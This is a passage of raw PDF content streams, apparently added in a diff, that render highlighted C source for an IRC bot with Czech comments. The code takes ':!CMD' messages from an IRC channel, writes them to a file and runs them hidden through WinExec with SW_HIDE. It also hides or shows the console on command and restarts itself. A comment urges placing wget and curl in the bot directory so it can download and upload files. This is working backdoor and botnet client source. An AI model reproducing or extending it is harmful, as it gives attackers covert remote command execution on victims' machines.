+(                )Tj
+(//Hey! Don't forget to download wget&curl in bot directory!! ;D)Tj
+T*
+(                )Tj
+(//With wget and curl you will be able to download and upload files...)Tj
+T*
+(                )Tj
+/F2 10 Tf 0 0 0.498 rg (if)Tj
+( )Tj
+0 0 0 rg (\()Tj
+( )Tj
+(\()Tj
+/F1 10 Tf (sub)Tj
+( )Tj
+/F2 10 Tf (=)Tj
+( )Tj
+(\()Tj
+/F1 10 Tf (strstr)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf (rcv)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf 0.498 0 0.498 rg (":!CMD ")Tj
+/F2 10 Tf 0 0 0 rg (\)\)\))Tj
+( )Tj
+(\))Tj
+( )Tj
+({)Tj
+T*
+(                   )Tj
+/F1 10 Tf (sub)Tj
+( )Tj
+/F2 10 Tf (=)Tj
+( )Tj
+/F1 10 Tf (sub)Tj
+/F2 10 Tf (+)Tj
+/F1 10 Tf 0 0.498 0.498 rg (6)Tj
+/F2 10 Tf 0 0 0 rg (;)Tj
+T*
+(                   )Tj
+/F1 10 Tf (sprintf)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf (snd)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf 0.498 0 0.498 rg ("%s")Tj
+/F2 10 Tf 0 0 0 rg (,)Tj
+( )Tj
+/F1 10 Tf (sub)Tj
+/F2 10 Tf (\);)Tj
+T*
+(                   )Tj
+/F1 10 Tf (printf)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf 0.498 0 0.498 rg ("!CMD %s")Tj
+/F2 10 Tf 0 0 0 rg (,)Tj
+( )Tj
+/F1 10 Tf (snd)Tj
+/F2 10 Tf (\);)Tj
+T*
+(                )Tj
+T*
+(                   )Tj
+/F1 10 Tf (sprintf)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf (msg)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf 0.498 0 0.498 rg ("Executing: %s")Tj
+/F2 10 Tf 0 0 0 rg (,)Tj
+( )Tj
+/F1 10 Tf (sub)Tj
+/F2 10 Tf (\);)Tj
+T*
+(                   )Tj
+/F1 10 Tf (irc_sendmsg)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf (s)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf (channel)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf (msg)Tj
+/F2 10 Tf (\);)Tj
+T*
+(                   )Tj
+/F1 10 Tf (printf)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf 0.498 0 0.498 rg ("!!! %s")Tj
+/F2 10 Tf 0 0 0 rg (,)Tj
+( )Tj
+/F1 10 Tf (msg)Tj
+/F2 10 Tf (\);)Tj
+T*
+(                   )Tj
+T*
+(                   )Tj
+/F1 10 Tf (FILE)Tj
+( )Tj
+/F2 10 Tf (*)Tj
+/F1 10 Tf (cmdf)Tj
+( )Tj
+/F2 10 Tf (=)Tj
+( )Tj
+/F1 10 Tf (fopen)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf (cmdfile)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf 0.498 0 0.498 rg ("w")Tj
+/F2 10 Tf 0 0 0 rg (\);)Tj
+T*
+(                   )Tj
+/F1 10 Tf (fprintf)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf (cmdf)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf 0.498 0 0.498 rg ("%s\\n")Tj
+/F2 10 Tf 0 0 0 rg (,)Tj
+( )Tj
+/F1 10 Tf (snd)Tj
+/F2 10 Tf (\);)Tj
+T*
+(                       )Tj
+/F1 10 Tf (fclose)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf (cmdf)Tj
+/F2 10 Tf (\);)Tj
+T*
+(                   )Tj
+T*
+(                   )Tj
+/F1 10 Tf (WinExec)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf (cmdfile)Tj
+/F2 10 Tf (,)Tj
+/F1 10 Tf (SW_HIDE)Tj
+/F2 10 Tf (\);)Tj
+( )Tj
+/F1 10 Tf 0 0.498 0 rg (//Hide console window)Tj
+T*
+(                   )Tj
+(//system\(cmdfile\); //Show console window)Tj
+T*
+(                   )Tj
+T*
+(                   )Tj
+(/*)Tj
+T*
+(                   STARTUPINFO si = { sizeof\(STARTUPINFO\) };)Tj
+T*
+(                   si.dwFlags = STARTF_USESHOWWINDOW;)Tj
+T*
+(                   si.wShowWindow = SW_HIDE;)Tj
+T*
+(                   PROCESS_INFORMATION pi;)Tj
+T*
+(                   CreateProcess\(NULL, cmdfile, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi\);)Tj
+T*
+(                   WaitForSingleObject\(pi.hProcess, INFINITE\);)Tj
+T*
+(                   DWORD exit_code;)Tj
+T*
+(                   GetExitCodeProcess\(pi.hProcess, &exit_code\);)Tj
+T*
+(                   */)Tj
+T*
+(                )Tj
+/F2 10 Tf 0 0 0 rg (})Tj
+T*
+(                )Tj
+/F1 10 Tf (sub)Tj
+( )Tj
+/F2 10 Tf (=)Tj
+( )Tj
+/F1 10 Tf 0 0.498 0.498 rg (0)Tj
+/F2 10 Tf 0 0 0 rg (;)Tj
+T*
+(                )Tj
+T*
+(                )Tj
+/F1 10 Tf 0 0.498 0 rg (//HIDE/SHOW \(windows.h\))Tj
+T*
+(                )Tj
+/F2 10 Tf 0 0 0.498 rg (if)Tj
+( )Tj
+0 0 0 rg (\()Tj
+( )Tj
+(\()Tj
+/F1 10 Tf (sub)Tj
+( )Tj
+/F2 10 Tf (=)Tj
+( )Tj
+(\()Tj
+/F1 10 Tf (strstr)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf (rcv)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf 0.498 0 0.498 rg (":!hide")Tj
+/F2 10 Tf 0 0 0 rg (\)\)\))Tj
+( )Tj
+(\))Tj
+( )Tj
+({)Tj
+( )Tj
+/F1 10 Tf (FreeConsole)Tj
+/F2 10 Tf (\(\);)Tj
+( )Tj
+(})Tj
+( )Tj
+/F1 10 Tf (sub)Tj
+( )Tj
+/F2 10 Tf (=)Tj
+( )Tj
+/F1 10 Tf 0 0.498 0.498 rg (0)Tj
+/F2 10 Tf 0 0 0 rg (;)Tj
+T*
+(                )Tj
+0 0 0.498 rg (if)Tj
+( )Tj
+0 0 0 rg (\()Tj
+( )Tj
+(\()Tj
+/F1 10 Tf (sub)Tj
+( )Tj
+/F2 10 Tf (=)Tj
+( )Tj
+(\()Tj
+/F1 10 Tf (strstr)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf (rcv)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf 0.498 0 0.498 rg (":!show")Tj
+/F2 10 Tf 0 0 0 rg (\)\)\))Tj
+( )Tj
+(\))Tj
+( )Tj
+({)Tj
+( )Tj
+/F1 10 Tf (AllocConsole)Tj
+/F2 10 Tf (\(\);)Tj
+( )Tj
+(})Tj
+( )Tj
+/F1 10 Tf (sub)Tj
+( )Tj
+/F2 10 Tf (=)Tj
+( )Tj
+/F1 10 Tf 0 0.498 0.498 rg (0)Tj
+/F2 10 Tf 0 0 0 rg (;)Tj
+T*
+(                )Tj
+T*
+(                )Tj
+/F1 10 Tf 0 0.498 0 rg (//RESTART)Tj
+T*
+(                )Tj
+/F2 10 Tf 0 0 0.498 rg (if)Tj
+( )Tj
+0 0 0 rg (\()Tj
+( )Tj
+(\()Tj
+/F1 10 Tf (sub)Tj
+( )Tj
+/F2 10 Tf (=)Tj
+( )Tj
+(\()Tj
+/F1 10 Tf (strstr)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf (rcv)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf 0.498 0 0.498 rg (":!restart")Tj
+/F2 10 Tf 0 0 0 rg (\)\)\))Tj
+( )Tj
+(\))Tj
+( )Tj
+({)Tj
+ET
+endstream
+endobj
+10 0 obj
+<</Length 2336>>
+stream
+BT 1 0 0 1 72 762 Tm
+/F2 10 Tf 0 0 0 rg (                     )Tj
+/F1 10 Tf (sprintf)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf (msg)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf 0.498 0 0.498 rg ("Please wait while restarting...")Tj
+/F2 10 Tf 0 0 0 rg (\);)Tj
+0 -12.0 TD
+(                     )Tj
+/F1 10 Tf (err)Tj
+( )Tj
+/F2 10 Tf (=)Tj
+( )Tj
+/F1 10 Tf (irc_sendmsg)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf (s)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf (channel)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf (msg)Tj
+/F2 10 Tf (\);)Tj
+T*
+(                     )Tj
+/F1 10 Tf (closesocket)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf (s)Tj
+/F2 10 Tf (\);)Tj
+T*
+(                     )Tj
+/F1 10 Tf (sprintf)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf (msg)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf 0.498 0 0.498 rg ("ERROR: Couldn't close socket :\(")Tj
+/F2 10 Tf 0 0 0 rg (\);)Tj
+T*
+(                     )Tj
+/F1 10 Tf (err)Tj
+( )Tj
+/F2 10 Tf (=)Tj
+( )Tj
+/F1 10 Tf (irc_sendmsg)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf (s)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf (channel)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf (msg)Tj
+/F2 10 Tf (\);)Tj
+T*
+(                     )Tj
+/F1 10 Tf (printf)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf 0.498 0 0.498 rg ("\\nRESTARTING...\\n\\n")Tj
+/F2 10 Tf 0 0 0 rg (\);)Tj
+T*
+(                )Tj
+(})Tj
+T*
+(                )Tj
+/F1 10 Tf (sub)Tj
+( )Tj
+/F2 10 Tf (=)Tj
+( )Tj
+/F1 10 Tf 0 0.498 0.498 rg (0)Tj
+/F2 10 Tf 0 0 0 rg (;)Tj
+T*
+(             )Tj
+(})Tj
+/F1 10 Tf 0 0.498 0 rg (//END LOCKED COMMANDS)Tj
+T*
+(    )Tj
+/F2 10 Tf 0 0 0 rg (})Tj
+/F1 10 Tf 0 0.498 0 rg (//LoopEND)Tj
+T*
+(    )Tj
+T*
+(    )Tj
+(//Zavrit)Tj
+T*
+(    )Tj
+0 0 0 rg (closesocket)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf (s)Tj
+/F2 10 Tf (\);)Tj
+T*
+(    )Tj
+/F1 10 Tf (printf)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf 0.498 0 0.498 rg ("!Error while sending\\nwaiting 5s before reconnect...\\n")Tj
+/F2 10 Tf 0 0 0 rg (\);)Tj
+T*
+(    )Tj
+/F1 10 Tf (sleep)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf 0 0.498 0.498 rg (5000)Tj
+/F2 10 Tf 0 0 0 rg (\);)Tj
+T*
+(    )Tj
+(})Tj
+/F1 10 Tf 0 0.498 0 rg (//InfiniteLoopEND)Tj
+T*
+(        )Tj
+T*
+(    )Tj
+(//Zavrit)Tj
+T*
+(    )Tj
+0 0 0 rg (closesocket)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf (s)Tj
+/F2 10 Tf (\);)Tj
+T*
+(    )Tj
+/F1 10 Tf (WSACleanup)Tj
+/F2 10 Tf (\(\);)Tj
+( )Tj
+/F1 10 Tf 0 0.498 0 rg (//Flushnout WSA    )Tj
+T*
+(    )Tj
+/F2 10 Tf 0 0 0.498 rg (return)Tj
+0 0 0 rg (\()Tj
+/F1 10 Tf 0 0.498 0.498 rg (0)Tj
+/F2 10 Tf 0 0 0 rg (\);)Tj
+T*
+(    )Tj
+T*
+(})Tj
+T*
+ET
+endstream
+endobj
+11 0 obj
+<</ProcSet[/PDF/Text]
+/Font<</F1 1 0 R/F2 2 0 R/F3 3 0 R/F4 4 0 R>> >>
+endobj
+12 0 obj
+<</Type/Page/Parent 18 0 R
+/MediaBox[ 0 0 595 842]
+/Contents 5 0 R
+/Resources 11 0 R
+>>
+endobj
+13 0 obj
+<</Type/Page/Parent 18 0 R
+/MediaBox[ 0 0 595 842]
+/Contents 6 0 R
+/Resources 11 0 R
+>>
+endobj
+14 0 obj
+<</Type/Page/Parent 18 0 R
+/MediaBox[ 0 0 595 842]
+/Contents 7 0 R
+/Resources 11 0 R
+>>
+endobj
+15 0 obj
+<</Type/Page/Parent 18 0 R
+/MediaBox[ 0 0 595 842]
+/Contents 8 0 R
+/Resources 11 0 R
+>>
+endobj
+16 0 obj
+<</Type/Page/Parent 18 0 R
+/MediaBox[ 0 0 595 842]
+/Contents 9 0 R
+/Resources 11 0 R
+>>
+endobj
+17 0 obj
+<</Type/Page/Parent 18 0 R
+/MediaBox[ 0 0 595 842]
+/Contents 10 0 R
+/Resources 11 0 R
+>>
+endobj
+18 0 obj
+<</Type/Pages/Kids[
+12 0 R
+13 0 R
+14 0 R
+15 0 R
+16 0 R
+17 0 R
+]/Count 6
+>>
+endobj
+19 0 obj
+<</Type/Catalog/Pages 18 0 R >>
+endobj
+xref
+0 20
+0000000000 65535 f 
+0000000015 00000 n 
+0000000111 00000 n 
+0000000212 00000 n 
+0000000316 00000 n 
+0000000424 00000 n 
+0000003977 00000 n 
+0000011954 00000 n 
+0000021758 00000 n 
+0000030438 00000 n 
+0000037896 00000 n 
+0000040283 00000 n 
+0000040370 00000 n 
+0000040474 00000 n 
+0000040578 00000 n 
+0000040682 00000 n 
+0000040786 00000 n 
+0000040890 00000 n 
+0000040995 00000 n 
+0000041086 00000 n 
+trailer
+<< /Size 20 /Root 19 0 R
+>>
+startxref
+41134
+%%EOF
